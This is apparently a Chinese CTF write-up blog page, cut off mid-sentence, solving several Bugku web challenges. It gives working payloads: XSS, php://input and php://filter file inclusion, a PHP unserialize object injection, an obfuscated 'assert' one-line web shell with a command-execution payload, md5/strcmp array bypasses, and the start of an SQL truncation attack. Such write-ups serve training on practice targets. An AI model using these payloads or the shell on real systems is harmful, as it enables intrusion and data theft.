class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析一波代码，</p><p>当cookie存在margin并且margin=margin时，file_list[2]赋值为keys.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当file在file_list中存在时，才会输出文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是</p><p><code>keys.php</code> base64编码为 <code>a2V5cy5waHA=</code></p><p>在cookie加上magin=margin，就可以拿到KEY</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527093560247.png" alt="1527093560247"></p><blockquote><p>KEY{key_keys}</p></blockquote><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote><p><a href="http://103.238.227.13:10089/" target="_blank" rel="noopener">http://103.238.227.13:10089/</a></p><p>Flag格式:Flag:xxxxxxxxxxxxxxxxxxxxxxxx</p></blockquote><p>首先我们查看源代码 发现可以通过xss注入  所以我们只需将&lt;和&gt;转义即可  于是我们构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure><p>即可获得flag</p><blockquote><p>Flag:17f094325e90085b30a5ddefce34acd8 </p></blockquote><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><blockquote><p><a href="http://120.24.86.145:8006/test/hello.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test/hello.php</a></p><p>作者：御结冰城</p></blockquote><p>查看源代码，发现有注释</p><blockquote><!--1p.html--> </blockquote><p>访问<code>view-source:http://120.24.86.145:8006/test/1p.html</code></p><p>有一段JavaScript代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> NewWords;</span><br><span class="line">NewWords = <span class="built_in">unescape</span>(Words);</span><br><span class="line"><span class="built_in">document</span>.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="comment">// --&gt;</span></span><br></pre></td></tr></table></figure><p>%3D是=，于是把Words这一串先url解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span><br></pre></td></tr></table></figure><p>再把注释起来的字符串base64解码，解码发现有很多%22之类的，再url解码一下得到php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://wiki.jikexueyuan.com/project/php/regular-expression/eregi.html" target="_blank" rel="noopener">eregi()函数</a>在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 </p><p>具体分析这篇博客讲得很清楚，奉上链接</p><p><a href="https://ciphersaw.me/2017/12/26/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20never%20give%20up/" target="_blank" rel="noopener">https://ciphersaw.me/2017/12/26/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20never%20give%20up/</a></p><p><a href="http://www.am0s.com/ctf/128.html" target="_blank" rel="noopener">CTF之PHP黑魔法总结</a></p><p>payload</p><blockquote><p>120.24.86.145:8006/test/hello.php?id=.&amp;b=%0012345&amp;a=php://input</p><p>bugku is a nice plateform!</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527136472042.png" alt="1527136472042"></p><blockquote><p>flag{tHis_iS_THe_fLaG}</p></blockquote><h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><blockquote><p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/</a> </p><p>作者：pupil </p></blockquote><p>解析WriteUp：<a href="https://ciphersaw.me/2018/01/03/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20welcome%20to%20bugkuctf/" target="_blank" rel="noopener">【Bugku CTF】 Web —— welcome to bugkuctf</a></p><p>查看源代码发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>/test1/?file=php://filter/read=convert.base64-encode/resource=hint.php&amp;txt=php://input</p><p>post请求：welcome to the bugkuctf</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527139396259.png" alt="1527139396259"></p><p>base64解码得</p><p>hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同理拿到index.php源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>/test1/?file=hint.php&amp;txt=php://input&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527139347636.png" alt="1527139347636"></p><blockquote><p>flag{php_is_the_best_language}</p></blockquote><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><blockquote><p><a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a></p><p>送给大家一个过狗一句话</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc);   $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>];</span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><blockquote><p><code>http://120.24.86.145:8010/?s=print_r(scandir(&#39;./&#39;));</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; 1.php</span><br><span class="line">    [3] =&gt; 123.txt</span><br><span class="line">    [4] =&gt; 2.php</span><br><span class="line">    [5] =&gt; 3.php</span><br><span class="line">    [6] =&gt; 4.php</span><br><span class="line">    [7] =&gt; 5.php</span><br><span class="line">    [8] =&gt; &lt;?php eval(</span><br><span class="line">    [9] =&gt; &lt;?php eval($_POST[1])</span><br><span class="line">    [10] =&gt; &lt;?php eval(\$_POST[1])</span><br><span class="line">    [11] =&gt; README.README</span><br><span class="line">    [12] =&gt; a.php</span><br><span class="line">    [13] =&gt; a.txt</span><br><span class="line">    [14] =&gt; c.php</span><br><span class="line">    [15] =&gt; chaoba</span><br><span class="line">    [16] =&gt; chaoba.aspx</span><br><span class="line">    [17] =&gt; chaoba1.php</span><br><span class="line">    [18] =&gt; chaoba2.php</span><br><span class="line">    [19] =&gt; conn</span><br><span class="line">    [20] =&gt; ddee.php</span><br><span class="line">    [21] =&gt; f.html</span><br><span class="line">    [22] =&gt; f.php</span><br><span class="line">    [23] =&gt; flag.txt</span><br><span class="line">    [24] =&gt; h.php</span><br><span class="line">    [25] =&gt; haha.php</span><br><span class="line">    [26] =&gt; index.php</span><br><span class="line">    [27] =&gt; ldl.txt</span><br><span class="line">    [28] =&gt; ll.php</span><br><span class="line">    [29] =&gt; loshell.php</span><br><span class="line">    [30] =&gt; olivia.txt</span><br><span class="line">    [31] =&gt; oudeniu.php</span><br><span class="line">    [32] =&gt; phpspy1.php</span><br><span class="line">    [33] =&gt; q.php</span><br><span class="line">    [34] =&gt; t2.php</span><br><span class="line">    [35] =&gt; testfile.txt</span><br><span class="line">    [36] =&gt; txxxc.php</span><br><span class="line">    [37] =&gt; x.php</span><br><span class="line">    [38] =&gt; xb.php</span><br><span class="line">    [39] =&gt; xxoo.php</span><br><span class="line">    [40] =&gt; xxoos.php</span><br><span class="line">    [41] =&gt; xxx.php</span><br><span class="line">    [42] =&gt; zaizheliflag.txt</span><br><span class="line">    [43] =&gt; zx.php</span><br><span class="line">)</span><br><span class="line">¿ÓµùµÄÌâÄ¿£¬To JBfei£¡</span><br></pre></td></tr></table></figure><p>访问flag.txt</p><blockquote><p>BUGKU{bugku_web_009801_a}</p></blockquote><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><blockquote><p>字符？正则？</p><p><a href="http://120.24.86.145:8002/web10/" target="_blank" rel="noopener">http://120.24.86.145:8002/web10/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就是考察正则表达式了</p><blockquote><p>1.表达式直接写出来的字符串直接利用，如key<br>2.“.”代表任意字符<br>3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以’^’开头，以’$’结束<br>4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束<br>5.[a-z]代表a-z中的任意一个字符<br>6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号<br>7./i代表大小写不敏感<br>8.{4-7}代表[0-9]中数字连续出现的次数是4-7次<br>9.\s匹配任意的空白符<br>10.\d   匹配数字<br>11.\b   匹配单词的开始或结束</p></blockquote><p>payload</p><blockquote><p>?id=key1key1111key:/a/keya!</p></blockquote><blockquote><p>KEY{0x0SIOPh550afc} </p></blockquote><p>参考：</p><p><a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">正则手册</a></p><p><a href="https://blog.csdn.net/u011377996/article/details/79340100#t2" target="_blank" rel="noopener">字符？正则？</a></p><h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><blockquote><p><a href="http://118.89.219.210:49162/" target="_blank" rel="noopener">http://118.89.219.210:49162/</a> </p><p>flag格式：SKCTF{xxxxxxxxxxxxxxxxxx} </p></blockquote><p>查看源代码发现</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527178429935.png" alt="1527178429935"></p><p>点击code.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5函数漏洞和strcmp数组绕过</p><p>payload</p><blockquote><p>?v1[]=0&amp;v2[]=1&amp;v3[]</p></blockquote><blockquote><p>SKCTF{Php_1s_tH3_B3St_L4NgUag3} </p></blockquote><h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><blockquote><p><a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">http://118.89.219.210:49163/</a><br>flag格式：SKCTF{xxxxxxxxxxxxxxxxx}<br>hint:SQL约束攻击</p></blockquote><p><a href="https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">约束攻击</a>又称为长字节截断攻击 </p><p>原理：</p><p>在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断</p><p> 比如数据库user字段的类型为 varchar(8)</p><p>当插入user的值为  <code>admin                                     1</code>，password=123456时</p><p>会插入一个用户名为admin，密码为123456的用户，就成功创建了一个admin用户</p><p>注册一个</p><blockquote><p><code>admin                                                         